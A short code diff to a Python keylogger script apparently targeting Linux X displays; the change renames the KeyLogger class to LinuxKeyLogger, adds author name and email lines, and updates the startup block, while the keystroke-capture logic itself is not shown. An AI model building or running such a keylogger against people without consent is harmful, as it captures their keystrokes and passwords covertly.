@@ -6,7 +6,10 @@ import time
 import threading
 import subprocess
 
-class KeyLogger(threading.Thread):
+__author__ = "Nathaniel Cotton"
+__email__ = "nec2887@rit.edu"
+
+class LinuxKeyLogger(threading.Thread):
     def __init__(self):
         super().__init__()
         self.display = Display()
@@ -114,6 +117,6 @@ class KeyLogger(threading.Thread):
 
 
 if __name__ == '__main__':
-    keyL = KeyLogger()
+    keyL = LinuxKeyLogger()
     # keyL.setDaemon(True)
     keyL.start()
